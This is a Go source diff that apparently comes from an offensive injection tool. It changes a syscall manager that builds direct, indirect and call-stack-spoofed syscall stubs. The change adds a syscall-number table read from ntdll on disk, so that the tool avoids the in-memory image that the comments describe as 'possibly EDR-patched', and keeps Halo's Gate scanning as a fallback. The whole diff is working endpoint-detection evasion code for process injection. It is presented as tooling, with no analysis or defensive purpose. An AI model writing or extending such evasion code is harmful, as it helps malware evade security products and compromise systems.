@@ -16,11 +16,30 @@ import (
 // Caches resolved SSNs and built stubs to avoid re-parsing ntdll on every inject.
 
 type syscallManager struct {
-	stubs map[string]uintptr
+	stubs    map[string]uintptr
+	ssnTable *SSNTable // pre-resolved SSN table from disk (nil = scan mapped image at runtime)
 }
 
 func newSyscallManager() *syscallManager {
 	return &syscallManager{stubs: make(map[string]uintptr)}
+}
+
+// setSSNTable injects a pre-resolved SSN table resolved from ntdll on disk at
+// startup. When present, stubs use the parsed numbers instead of re-scanning
+// the mapped (possibly EDR-patched) image.
+func (sm *syscallManager) setSSNTable(table *SSNTable) {
+	sm.ssnTable = table
+}
+
+// ssnFor returns the syscall number for a name, preferring the pre-resolved
+// table (from disk at startup) and falling back to scanning the mapped image.
+func (sm *syscallManager) ssnFor(funcName string) (uint16, bool) {
+	if sm.ssnTable != nil {
+		if ssn, ok := sm.ssnTable.Lookup(funcName); ok {
+			return ssn, true
+		}
+	}
+	return 0, false
 }
 
 // getStub returns a direct syscall stub (no call stack spoofing).
@@ -28,11 +47,17 @@ func (sm *syscallManager) getStub(funcName string) (uintptr, error) {
 	if addr, ok := sm.stubs[funcName]; ok {
 		return addr, nil
 	}
-	ssn, err := findSyscallNumHalo(funcName)
-	if err != nil {
-		ssn, err = findSyscallNum(funcName)
+	var ssn uint32
+	if s, ok := sm.ssnFor(funcName); ok {
+		ssn = uint32(s)
+	} else {
+		var err error
+		ssn, err = findSyscallNumHalo(funcName)
 		if err != nil {
-			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			ssn, err = findSyscallNum(funcName)
+			if err != nil {
+				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			}
 		}
 	}
 	code := []byte{
@@ -59,11 +84,17 @@ func (sm *syscallManager) getSpoofedStub(funcName string) (uintptr, error) {
 		return addr, nil
 	}
 
-	ssn, err := findSyscallNumHalo(funcName)
-	if err != nil {
-		ssn, err = findSyscallNum(funcName)
+	var ssn uint32
+	if s, ok := sm.ssnFor(funcName); ok {
+		ssn = uint32(s)
+	} else {
+		var err error
+		ssn, err = findSyscallNumHalo(funcName)
 		if err != nil {
-			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			ssn, err = findSyscallNum(funcName)
+			if err != nil {
+				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			}
 		}
 	}
 
@@ -112,11 +143,17 @@ func (sm *syscallManager) getIndirectStub(funcName string) (uintptr, error) {
 	if addr, ok := sm.stubs[cacheKey]; ok {
 		return addr, nil
 	}
-	ssn, err := findSyscallNumHalo(funcName)
-	if err != nil {
-		ssn, err = findSyscallNum(funcName)
+	var ssn uint32
+	if s, ok := sm.ssnFor(funcName); ok {
+		ssn = uint32(s)
+	} else {
+		var err error
+		ssn, err = findSyscallNumHalo(funcName)
 		if err != nil {
-			return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			ssn, err = findSyscallNum(funcName)
+			if err != nil {
+				return 0, fmt.Errorf("findSyscallNum(%s): %w", funcName, err)
+			}
 		}
 	}
 	gadget, err := findSyscallGadget()
